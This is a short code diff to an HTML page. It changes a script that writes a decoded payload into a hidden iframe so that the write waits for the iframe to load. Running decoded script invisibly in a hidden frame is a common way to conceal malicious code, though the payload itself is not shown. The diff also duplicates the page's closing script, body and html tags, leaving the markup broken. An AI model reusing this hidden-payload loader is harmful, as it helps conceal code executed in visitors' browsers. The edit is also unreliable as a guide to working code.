@@ -31,16 +31,18 @@
             iframe.style.display = 'none'; // Hide the iframe from view
             document.body.appendChild(iframe);
 
-            // Access the iframe's document and write the decoded script
-            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            // Wait for the iframe to load before writing to it
+            iframe.onload = function() {
+                var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
 
-            if (iframeDoc) {
-                iframeDoc.open();
-                iframeDoc.write('<script>' + decodedPayload + '<\/script>');
-                iframeDoc.close();
-            } else {
-                console.error('Failed to access iframe document');
-            }
+                if (iframeDoc) {
+                    iframeDoc.open();
+                    iframeDoc.write('<script>' + decodedPayload + '<\/script>');
+                    iframeDoc.close();
+                } else {
+                    console.error('Failed to access iframe document');
+                }
+            };
         }
 
         // Create the button element
@@ -51,6 +53,9 @@
 
         // Append the button to the body
         document.body.appendChild(button);
+    </script>
+</body>
+</html>
     </script>
 </body>
 </html>
